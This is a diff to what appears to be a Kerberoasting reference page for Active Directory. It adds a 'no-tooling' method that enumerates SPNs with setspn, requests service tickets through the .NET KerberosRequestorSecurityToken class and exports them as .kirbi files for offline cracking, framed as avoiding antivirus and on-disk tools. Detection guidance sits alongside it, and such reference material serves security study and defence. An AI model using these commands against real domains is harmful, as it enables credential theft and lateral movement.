@@ -46,6 +46,8 @@ GetUserSPNs.py -request -dc-ip 10.0.0.1 -no-preauth victim corp.lab/
 
 Once cracked, the cleartext often unlocks lateral movement: same password is reused for the service's local admin elsewhere, or the account is itself a Domain Admin (a common misconfiguration).
 
+No-tooling variant for constrained shells: `setspn -T <domain> -Q */*` enumerates every SPN using a signed Microsoft binary that almost never trips AV, and the pure-.NET `KerberosRequestorSecurityToken` class (`Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.corp.lab:1433"`) requests the TGS into the current logon session — `klist` / `kerberos::list /export` then writes it to a `.kirbi` for offline extraction. Combined with `Get-ADObject` filtering (`servicePrincipalName -ne $null -and cn -ne "krbtgt"`) this avoids dropping PowerView or Rubeus on disk.
+
 ## Detection and defence
 - 4769 events with `TicketEncryptionType=0x17` (RC4) for a user account SPN are the canonical signal. Volume + non-business-hours + many distinct SPNs = roasting.
 - Defender for Identity has a "Suspected Kerberoasting" detector keyed on enumeration patterns.
@@ -59,3 +61,4 @@ Once cracked, the cleartext often unlocks lateral movement: same password is reu
 - [HackTricks — Kerberoast](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html) — tool reference
 - [SpecterOps — Cracking Kerberos](https://posts.specterops.io/) — modern AES considerations
 - [Microsoft — Decrypting the selection of supported Kerberos encryption types](https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797) — enctype matrix
+- [ired.team — Kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting) — lab walkthrough using setspn, KerberosRequestorSecurityToken and tgsrepcrack
